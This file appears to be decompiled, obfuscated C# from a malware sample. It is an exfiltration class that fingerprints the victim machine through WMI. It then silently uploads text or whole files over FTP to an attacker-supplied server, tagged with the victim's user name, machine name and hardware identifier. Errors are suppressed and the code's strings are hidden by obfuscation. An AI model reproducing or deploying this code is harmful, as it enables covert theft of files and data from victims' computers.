using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

internal sealed class SYJrybFSgaPzO
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string AaOvZSRLQs()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107355285));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107355264)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107355279);
			ManagementObject val3 = new ManagementObject(getString_0(107355274) + text2 + getString_0(107355233));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107355196)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107408511) : text;
		}
	}

	public static void xcRMBpaQVPnOJtxY(string HiTfrmNSuCDE = "URL", string MXXPUriPZVegn = "USERNAME", string AjFVphHHNMsycCoE = "ACCESO", string KJvhFrdlmPg = "")
	{
		try
		{
			string text = AaOvZSRLQs();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(HiTfrmNSuCDE + getString_0(107356389) + Environment.UserName + getString_0(107356856) + Environment.MachineName + getString_0(107356867) + text + getString_0(107356830));
			ftpWebRequest.Method = getString_0(107355203);
			ftpWebRequest.Credentials = new NetworkCredential(MXXPUriPZVegn, AjFVphHHNMsycCoE);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(KJvhFrdlmPg);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void JEuvJEKelGD(string pROLkQZotNModD = "URL", string mSiOEpxpNPQoF = "USERNAME", string jjYxssQYEjma = "ACCESO", string rhcqXWEvzWb = "")
	{
		try
		{
			string text = AaOvZSRLQs();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(pROLkQZotNModD + getString_0(107356389) + Environment.UserName + getString_0(107356856) + Environment.MachineName + getString_0(107356867) + text + getString_0(107356867) + Path.GetFileName(rhcqXWEvzWb));
			ftpWebRequest.Method = getString_0(107355203);
			ftpWebRequest.Credentials = new NetworkCredential(mSiOEpxpNPQoF, jjYxssQYEjma);
			byte[] array = File.ReadAllBytes(rhcqXWEvzWb);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static SYJrybFSgaPzO()
	{
		Strings.CreateGetStringDelegate(typeof(SYJrybFSgaPzO));
	}
}
